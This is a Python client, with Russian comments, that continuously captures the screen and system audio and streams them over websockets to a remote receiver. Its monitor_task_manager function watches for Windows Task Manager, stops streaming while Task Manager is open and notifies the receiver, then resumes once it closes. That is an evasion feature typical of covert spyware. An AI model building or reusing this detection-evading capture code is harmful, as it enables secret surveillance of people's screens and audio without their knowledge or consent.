import asyncio
import io
import logging
import time
import threading
import sys

import numpy as np
import requests
import soundcard as sc
import websockets
from websockets.datastructures import Headers
from mss import mss
from PIL import Image
from asyncio_throttle import Throttler
import psutil
import aiohttp

import source_config as cfg

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("SourceClient")

# --- Глобальные события ---
global_stop_event = threading.Event()
pause_streaming_event = asyncio.Event()


async def send_stop_status(ip, port):
    """
    Отправляет POST-запрос на сервер для уведомления о статусе 'stopped'.
    Вызывается при обнаружении диспетчера задач.
    """
    url = f"http://{ip}:{port}/update"
    payload = {'status': 'stopped', 'first': '', 'second': ''}
    logger.info(f"Sending 'stopped' status update to {url}")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=payload, timeout=5) as response:
                if response.status == 200:
                    logger.info(f"Successfully sent 'stopped' status to {url}.")
                else:
                    logger.error(
                        f"Failed to send 'stopped' status to {url}. "
                        f"Status: {response.status}, Body: {await response.text()}"
                    )
    except aiohttp.ClientConnectorError as e:
        logger.error(f"Connection error while sending 'stopped' status to {url}: {e}")
    except asyncio.TimeoutError:
        logger.error(f"Timeout error while sending 'stopped' status to {url}.")
    except Exception as e:
        logger.error(f"An unexpected error occurred while sending 'stopped' status: {e}", exc_info=True)


def find_soundcard_device(device_name_part: str):
    if not device_name_part:
        logger.warning("Audio device name not specified, using default loopback.")
        try:
            return sc.default_microphone(include_loopback=True)
        except Exception as e:
            logger.error(f"Could not get default loopback device: {e}. Trying default microphone.")
            return sc.default_microphone()

    device_name_part_lower = device_name_part.lower()
    mics = sc.all_microphones(include_loopback=True)
    found_mic = None
    loopback_found = None
    for mic in mics:
        if device_name_part_lower in mic.name.lower():
            if mic.isloopback:
                logger.info(f"Found loopback device matching name: {mic.name}")
                loopback_found = mic
                break
            else:
                if found_mic is None:
                    found_mic = mic
    if loopback_found:
        return loopback_found
    elif found_mic:
        logger.warning(f"Found non-loopback device matching name: {found_mic.name}. Using it as fallback.")
        return found_mic
    logger.error(f"Audio device containing '{device_name_part}' not found.")
    logger.info("Available microphones (including loopback):")
    for i, mic_dev in enumerate(
            mics):
        lb = "(Loopback)" if mic_dev.isloopback else ""
        logger.info(f"  {i}: {mic_dev.name} {lb}")
    raise ValueError(f"Audio device containing '{device_name_part}' not found.")


def _soundcard_record_loop(mic_device, queue: asyncio.Queue, stop_event: threading.Event,
                           pause_event_loop: asyncio.Event, main_loop: asyncio.AbstractEventLoop):
    chunk_frames = int(cfg.SAMPLE_RATE * cfg.AUDIO_CHUNK_DURATION)
    logger.info(f"Starting soundcard recording loop (chunk size: {chunk_frames} frames)...")
    is_paused_logged = False

    try:
        with mic_device.recorder(samplerate=cfg.SAMPLE_RATE, channels=cfg.CHANNELS, blocksize=chunk_frames) as mic:
            logger.info(f"Soundcard recorder started on {mic_device.name}")
            while not stop_event.is_set():
                if pause_event_loop.is_set():
                    if not is_paused_logged:
                        logger.info("Audio recording PAUSED due to Task Manager.")
                        is_paused_logged = True

                    while not queue.empty():
                        try:
                            main_loop.call_soon_threadsafe(queue.get_nowait)
                            main_loop.call_soon_threadsafe(queue.task_done)
                        except asyncio.QueueEmpty:
                            break
                        except RuntimeError:
                            break
                    time.sleep(0.1)
                    continue

                if is_paused_logged:
                    logger.info("Audio recording RESUMED.")
                    is_paused_logged = False

                try:
                    data = mic.record(numframes=chunk_frames)
                    if cfg.CHANNELS == 1 and data.shape[1] > 1:
                        mono_data = data[:, 0]
                    else:
                        mono_data = data
                    audio_chunk_float32 = mono_data.astype(np.float32).flatten()

                    try:
                        main_loop.call_soon_threadsafe(queue.put_nowait, audio_chunk_float32)
                    except asyncio.QueueFull:
                        logger.warning("Audio queue is full, dropping frame in recording thread.")
                    except RuntimeError:
                        logger.warning("Event loop closed, cannot put audio frame.")
                        break
                except Exception as e:
                    if stop_event.is_set(): break
                    logger.error(f"Error during soundcard record/queue put: {e}")
                    time.sleep(0.1)
    except Exception as e:
        if not stop_event.is_set():
            logger.error(f"Error initializing soundcard recorder: {e}", exc_info=True)
    finally:
        logger.info("Soundcard recording loop finished.")


async def capture_and_send_video(uri, stop_event: threading.Event, pause_event: asyncio.Event):
    logger.info(f"Starting video stream to {uri}")

    auth_headers = Headers({"X-Auth-Token": cfg.WEBSOCKET_SECRET_KEY})

    is_paused_logged = False
    while not stop_event.is_set():
        if pause_event.is_set():
            if not is_paused_logged:
                logger.info("Video streaming PAUSED due to Task Manager.")
                is_paused_logged = True
            await asyncio.sleep(0.5)
            continue

        if is_paused_logged:
            logger.info("Video streaming RESUMED.")
            is_paused_logged = False

        try:
            async with websockets.connect(uri, ping_interval=10, ping_timeout=10, extra_headers=auth_headers) as websocket:
                logger.info("Video WebSocket connected (or reconnected).")
                with mss() as sct:
                    monitor = sct.monitors[cfg.MONITOR_NUM]

                    if not is_paused_logged:
                        logger.info(f"Capturing from monitor: {monitor}")

                    while not stop_event.is_set():
                        if pause_event.is_set():
                            if not is_paused_logged:
                                logger.info("Video streaming PAUSED due to Task Manager (inner loop).")
                                is_paused_logged = True
                            await websocket.close()
                            logger.info("Video WebSocket closed due to pause.")
                            break

                        if is_paused_logged:
                            logger.info("Video streaming RESUMED (inner loop).")
                            is_paused_logged = False
                            break

                        try:
                            img_bytes = sct.grab(monitor)
                            loop = asyncio.get_event_loop()
                            buffer = await loop.run_in_executor(
                                None, _encode_frame, img_bytes, cfg.VIDEO_QUALITY
                            )
                            jpeg_bytes = buffer.getvalue()
                            if jpeg_bytes:
                                await websocket.send(jpeg_bytes)
                            await asyncio.sleep(1.0 / cfg.FRAME_RATE)
                        except (
                                websockets.exceptions.ConnectionClosedOK,
                                websockets.exceptions.ConnectionClosedError) as e:
                            if not pause_event.is_set():
                                logger.warning(f"Video WebSocket closed: {e}. Reconnecting...")
                            break
                        except Exception as e:
                            if stop_event.is_set() or pause_event.is_set(): break
                            logger.error(f"Error in video sending loop: {e}", exc_info=True)
                            await asyncio.sleep(1)
        except (websockets.exceptions.WebSocketException, ConnectionRefusedError, OSError) as e:
            if stop_event.is_set(): break
            if not pause_event.is_set():
                logger.error(f"Video WebSocket connection failed: {e}. Retrying in 5 seconds...")
                await asyncio.sleep(5)
            else:
                await asyncio.sleep(0.5)
        except Exception as e:
            if stop_event.is_set(): break
            logger.error(f"Unexpected error in capture_and_send_video: {e}", exc_info=True)
            await asyncio.sleep(5)
    logger.info("Video streaming task finished.")


def _encode_frame(img_bytes, quality) -> io.BytesIO:
    try:
        img = Image.frombytes("RGB", (img_bytes.width, img_bytes.height), img_bytes.rgb)
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG", quality=quality)
        return buffer
    except Exception as e:
        logger.error(f"Error encoding frame: {e}")
        return io.BytesIO()


async def send_audio(uri, queue: asyncio.Queue, stop_event: threading.Event, pause_event: asyncio.Event):
    logger.info(f"Starting audio sending task to {uri}")
    throttler = Throttler(rate_limit=(1 / cfg.AUDIO_CHUNK_DURATION) * 1.1, period=1.0)

    auth_headers = Headers({"X-Auth-Token": cfg.WEBSOCKET_SECRET_KEY})

    is_paused_logged = False

    while not stop_event.is_set():
        if pause_event.is_set():
            if not is_paused_logged:
                logger.info("Audio sending PAUSED due to Task Manager.")
                is_paused_logged = True
            await asyncio.sleep(0.5)
            continue

        if is_paused_logged:
            logger.info("Audio sending RESUMED.")
            is_paused_logged = False

        try:
            async with websockets.connect(uri, ping_interval=10, ping_timeout=10, extra_headers=auth_headers) as websocket:
                logger.info("Audio WebSocket connected (or reconnected).")
                while not stop_event.is_set():
                    if pause_event.is_set():
                        if not is_paused_logged:
                            logger.info("Audio sending PAUSED due to Task Manager (inner loop).")
                            is_paused_logged = True
                        await websocket.close()
                        logger.info("Audio WebSocket closed due to pause.")
                        break

                    if is_paused_logged:
                        logger.info("Audio sending RESUMED (inner loop).")
                        is_paused_logged = False
                        break

                    try:
                        audio_chunk = await asyncio.wait_for(queue.get(),
                                                             timeout=0.2)
                        audio_bytes = audio_chunk.tobytes()
                        async with throttler:
                            await websocket.send(audio_bytes)
                        queue.task_done()
                    except asyncio.TimeoutError:
                        continue
                    except (websockets.exceptions.ConnectionClosedOK, websockets.exceptions.ConnectionClosedError) as e:
                        if not pause_event.is_set():
                            logger.warning(f"Audio WebSocket closed: {e}. Reconnecting...")
                        break
                    except Exception as e:
                        if stop_event.is_set() or pause_event.is_set(): break
                        logger.error(f"Error in audio sending loop: {e}", exc_info=True)
                        if not pause_event.is_set():
                            while not queue.empty():
                                try:
                                    queue.get_nowait();
                                    queue.task_done()
                                except asyncio.QueueEmpty:
                                    break
                            logger.info("Audio queue cleared after send error.")
                        await asyncio.sleep(1)
        except (websockets.exceptions.WebSocketException, ConnectionRefusedError, OSError) as e:
            if stop_event.is_set(): break
            if not pause_event.is_set():
                logger.error(f"Audio WebSocket connection failed: {e}. Retrying in 5 seconds...")
                await asyncio.sleep(5)
            else:
                await asyncio.sleep(0.5)
        except Exception as e:
            if stop_event.is_set(): break
            logger.error(f"Unexpected error in send_audio: {e}", exc_info=True)
            await asyncio.sleep(5)
    logger.info("Audio sending task finished.")


async def monitor_task_manager(stop_event: threading.Event, pause_event: asyncio.Event):
    if sys.platform != "win32":
        logger.info("Task Manager monitoring is only available on Windows. Skipping.")
        return

    logger.info("Starting Task Manager monitoring...")
    task_manager_was_running = False
    while not stop_event.is_set():
        try:
            found_task_manager_now = False
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                    found_task_manager_now = True
                    break

            if found_task_manager_now:
                if not task_manager_was_running:
                    logger.warning("Task Manager (Taskmgr.exe) DETECTED! Pausing streaming and sending stop signal.")
                    try:
                        url = f"http://{cfg.RECEIVER_IP}:{cfg.RECEIVER_PORT}/update"
                        payload = {'status': 'stopped', 'first': '', 'second': ''}
                        logger.info(f"Sending 'stopped' status update to {url}")
                        requests.post(url, data=payload, timeout=5)
                    except requests.exceptions.RequestException as e:
                        pass
                    pause_event.set()
                    task_manager_was_running = True
                    #asyncio.create_task(send_stop_status(cfg.RECEIVER_IP, cfg.RECEIVER_PORT))
            else:
                if task_manager_was_running:
                    logger.info("Task Manager (Taskmgr.exe) CLOSED. Resuming streaming.")
                    pause_event.clear()
                    task_manager_was_running = False

            await asyncio.sleep(1)
        except psutil.NoSuchProcess:
            pass
        except Exception as e:
            if stop_event.is_set(): break
            logger.error(f"Error during Task Manager monitoring: {e}", exc_info=True)
            await asyncio.sleep(5)
    logger.info("Task Manager monitoring task finished.")


async def main():
    global global_stop_event, pause_streaming_event
    audio_thread = None

    audio_queue = asyncio.Queue(maxsize=100)

    try:

        mic_device = find_soundcard_device(cfg.AUDIO_DEVICE_NAME)
        main_event_loop = asyncio.get_running_loop()

        audio_thread = threading.Thread(
            target=_soundcard_record_loop,
            args=(mic_device, audio_queue, global_stop_event, pause_streaming_event, main_event_loop),
            daemon=True
        )
        audio_thread.start()
        logger.info("Audio recording thread started.")
        await asyncio.sleep(0.5)
        if not audio_thread.is_alive():
            logger.error("Audio recording thread failed to start properly!")
            return

        video_uri = f"ws://{cfg.RECEIVER_IP}:{cfg.RECEIVER_PORT}/ws/source/video"
        audio_uri = f"ws://{cfg.RECEIVER_IP}:{cfg.RECEIVER_PORT}/ws/source/audio"

        video_task = asyncio.create_task(capture_and_send_video(video_uri, global_stop_event, pause_streaming_event))
        audio_send_task = asyncio.create_task(
            send_audio(audio_uri, audio_queue, global_stop_event, pause_streaming_event))
        monitor_task = asyncio.create_task(monitor_task_manager(global_stop_event, pause_streaming_event))

        all_tasks = [video_task, audio_send_task, monitor_task]
        done, pending = await asyncio.wait(all_tasks, return_when=asyncio.FIRST_COMPLETED)

        global_stop_event.set()
        pause_streaming_event.set()

        for task in pending:
            task.cancel()

        await asyncio.gather(*pending, return_exceptions=True)

    except (KeyboardInterrupt, SystemExit):
        logger.info("Application is shutting down due to user request or system event.")
    except ValueError as e:
        logger.error(f"Configuration error: {e}")
    except Exception as e:
        logger.error(f"Error in main execution: {e}", exc_info=True)
    finally:
        logger.info("Main loop stopping...")
        global_stop_event.set()
        pause_streaming_event.set()

        if audio_thread and audio_thread.is_alive():
            logger.info("Waiting for audio recording thread to finish...")
            audio_thread.join(timeout=3.0)
            if audio_thread.is_alive():
                logger.warning("Audio recording thread did not finish gracefully.")

        tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
        if tasks:
            logger.info(f"Cancelling {len(tasks)} outstanding asyncio tasks...")
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            logger.info("Outstanding asyncio tasks cancelled.")

        logger.info("Cleanup complete. Application exited.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Source client stopped by user (Ctrl+C in __main__).")
    finally:
        global_stop_event.set()
        if 'pause_streaming_event' in globals() and isinstance(pause_streaming_event, asyncio.Event):
            try:
                if pause_streaming_event._loop and pause_streaming_event._loop.is_running():
                    pause_streaming_event._loop.call_soon_threadsafe(pause_streaming_event.set)
            except Exception as e:
                logger.debug(f"Could not set pause_streaming_event in final cleanup: {e}")
        logger.info("Ensuring final stop signals are sent.")
